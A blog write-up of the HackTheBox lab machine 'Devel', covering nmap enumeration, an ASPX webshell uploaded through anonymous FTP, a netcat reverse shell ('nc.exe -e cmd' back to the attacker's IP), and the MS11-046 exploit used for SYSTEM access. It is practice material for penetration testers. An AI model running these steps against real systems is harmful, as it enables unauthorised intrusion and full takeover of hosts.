---
layout: post
title:  "HackTheBox - Devel Writeup"
categories: [HackTheBox]
tags: [pentesting]
draft: false
---

# Introduction

This is a writeup for the machine "Devel" (10.10.10.5) on the platform HackTheBox. HackTheBox is a penetration testing labs platform so aspiring pen-testers & pen-testers can practice their hacking skills in a variety of different scenarios.

## Enumeration

### NMAP

As usual we're going to start off with our two nmap scans, a full TCP scan using `nmap -sV -sC -p- 10.10.10.5` and `nmap -sU -p- 10.10.10.5` in this case, we only returned ports open on TCP so we're going to look at that now.

```
Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-21 16:59 BST
Nmap scan report for 10.10.10.5
Host is up (0.039s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

As you can see we've got two ports FTP & HTTP, FTP stands out right away because NMAP has confirmed for us that Anonymous login is allowed, that is a severe miss configuration which we can take advantage of. It even looks like the web server root is also the FTP server root, this is another sysadmin fail. We'll login to that in just a few moments, but first our web server appears to be running IIS 7.5, normally I would look for some low-hanging exploits however, given that the FTP root is the same as the web-server root, and we know that it's running ASP.NET, we're not going to go for that as I think there will be an easier path.

### FTP & HTTP

Upon logging into the FTP server we can see the same files as per the NMAP scan, and by visiting the site on HTTP we can confirm that the web root is the same as the FTP root so we're going to try and upload an ASPX shell, luckily for us there is one built into Kali. Because it's running IIS 7.5 which is relatively new we made the assumption it'd be using ASPX rather than ASP. The difference being that ASP is VBScript based and ASPX is .NET based this is a neat little thing to remember when attacking IIS servers.

```
ftp> put /usr/share/webshells/aspx/cmdasp.aspx cmd.aspx
local: /usr/share/webshells/aspx/cmdasp.aspx remote: cmd.aspx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
1442 bytes sent in 0.01 secs (200.5416 kB/s)
```

On port 80, let's try and visit this page and see what happens, if we look at the screenshot below, we've got a command box, that's good! That means our webshell uploaded correctly as expected.

![asp web-shell](/assets/images/2019-05-25-Devel/Screenshot-2019-5-25.png)

Now that we know that works, lets try and use this to execute a netcat.exe, we know that we can upload and it's going into the web root folder so this should allow us to leverage this in order to get a reverse shell on the device.

## User Exploitation

Let's put netcat.exe on the device using FTP. It's important to note that we do need to set the FTP transfer mode to binary, else netcat is not going to execute and we'll get an error when trying to execute the file. The webserver was by default using ASCII mode, in general we only want to use ASCII mode for transferring things such as text files and the like, as we're trying to execute something, we switch to binary mode. You can verify the transfer mode the server is using over FTP by using the `type` in our case we are returned `Using ascii mode to transfer files.` hence why we changed it to binary mode by typing `binary`

```
ftp> binary
200 Type set to I.
ftp> put /usr/share/windows-binaries/nc.exe nc.exe
local: /usr/share/windows-binaries/nc.exe remote: nc.exe
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
59392 bytes sent in 0.09 secs (639.0480 kB/s)
```

We didn't actually test our webshell yet so let's run a simple `whoami` in the shell and press execute, as you can see in the below screenshot `iis apppool\web` is returned so we know that our webshell for sure works and we know that the webserver is not running as system at least (that'd be a major sysadmin fail).

![asp webshell execution](/assets/images/2019-05-25-Devel/webshell-execution.png)

So as you can see, we've got basic execution, now what we're going to do is get the web server to execute netcat for our reverse shell, let's first set a listener up on port 80 with `nc -nvlp 80`. We're now going to use our remote code execution to find the full path for the netcat.exe that we uploaded. We can do this using the `dir` command - `dir /s/b C:\ | find /i "nc.exe` it turns out it is located at `C:\inetpub\wwwroot\nc.exe` in order to execute this then we're just going to run `C:\inetpub\wwwroot\nc.exe -e cmd 10.10.14.12 80` which will give us a connection back to our listener, we've now got a login. I did initially try and get to the `user.txt` flag however because I was only a service account I did not have access this meant we need to priv-esc.

## Privilege Escalation

So, we're on the device, let's work on the priv-esc - the first thing we should run as soon as we access a Windows system is `systeminfo` it's going to give us the OS version which is very powerful as we can then start to search for priv-esc flaws in the operating system.

```
c:\windows\system32\inetsrv>systeminfo
systeminfo

Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
Registered Organization:   
Product ID:                55041-051-0948536-86302
Original Install Date:     17/3/2017, 4:17:31 ��
System Boot Time:          28/5/2019, 8:07:50 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~1996 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 3/7/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     1.023 MB
Available Physical Memory: 683 MB
Virtual Memory: Max Size:  2.047 MB
Virtual Memory: Available: 1.497 MB
Virtual Memory: In Use:    550 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.5
```

In the codeblock above, right at the top you can see the "OS Version" as you see for this box the OS version is "6.1.7600 Build 7600", let's do some Google-fu and append "privilege escalation" on the end. The very first result we get is [MS11-046 on ExploitDB](https://www.exploit-db.com/exploits/40564), let's check out this exploit. As you can see commented out at the top of the exploit, the author has listed the vulnerable OS's and Windows 7 X86 is listed, we see no mention of enterprise but we're going to assume that our target is vulnerable to this exploit.

To save myself a headache of compiling this exploit on Linux (because we will get errors on Linux due to some of the includes) we're going to take advantage of a repository put together by [Abatchy17 called "WindowsExploits"](https://github.com/abatchy17/WindowsExploits) it's no longer being updated but as we can see, our exploit MS11-046 is in there pre-compiled so let's `git clone` the repo and then use our anonymous FTP login to upload the file to the server once again making sure the type is set to binary else the file won't execute.

```
ftp> binary
200 Type set to I.
ftp> 
ftp> put /root/Documents/WindowsExploits/WindowsExploits/MS11-046/MS11-046.exe MS11-046.exe
local: /root/Documents/WindowsExploits/WindowsExploits/MS11-046/MS11-046.exe remote: MS11-046.exe
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
112815 bytes sent in 0.08 secs (1.3597 MB/s)
ftp> 
```

Now we've got the exploit on the system all we need to do is execute it, simple right? Yup! If you don't know where the file is you can take advantage of dir again however we know that the path is `C:\inetpub\wwwroot\` anyway so let's execute the file by doing `C:\inetpub\wwwroot\MS11-046.exe` and after about 10 seconds we're going to see the `System32` prompt, let's do a `whoami` to verify and we should see `nt authority\system`. That's it! That's our priv-esc done so now we can go ahead and get the user + root flag and we're done.

Thank you for reading another writeup, this is an OSCP like box so this is great practice for that! In another post we will cover how MS11-046 works a little more because it's for sure a priv-esc exploit we want to keep in mind!